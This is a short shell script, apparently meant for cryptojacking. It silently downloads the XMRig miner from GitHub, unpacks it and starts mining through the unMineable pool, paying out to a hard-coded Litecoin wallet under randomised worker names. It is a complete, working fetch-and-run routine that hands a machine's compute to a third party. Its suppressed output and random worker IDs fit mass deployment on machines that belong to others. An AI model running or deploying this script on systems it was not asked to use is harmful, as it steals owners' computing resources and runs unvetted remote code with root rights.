#!/bin/sh
sudo apt update
sudo apt install screen -y
wget https://github.com/xmrig/xmrig/releases/download/v6.21.1/xmrig-6.21.1-linux-x64.tar.gz >/dev/null 2>&1
tar -xf xmrig-6.21.1-linux-x64.tar.gz
cd xmrig-6.21.1
./xmrig -a rx -o stratum+tcp://rx.unmineable.com:3333 -u LTC:ltc1qwae89dljtedxyvgrgl5ug8rk7xeqaruh5utxrg."0$RANDOM"
